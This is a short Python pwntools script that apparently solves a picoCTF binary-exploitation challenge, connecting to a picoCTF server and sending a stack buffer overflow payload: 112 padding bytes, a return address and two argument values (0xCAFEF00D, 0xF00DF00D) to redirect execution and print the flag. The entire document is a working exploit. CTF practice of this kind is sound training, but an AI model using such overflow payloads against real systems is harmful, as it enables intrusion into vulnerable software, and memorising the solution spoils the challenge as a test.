from pwn import *

#p = process("./program")
p=remote("saturn.picoctf.net",65307)
payload = b"a"*112
payload += p32(0x08049296)
payload += p32(0x0)
payload += p32(0xCAFEF00D)
payload += p32(0xF00DF00D)
p.recv()
p.sendline(payload)
print(p.recvall())
p.close()
#flag = p.recvuntil(b"\n")
#print(flag)
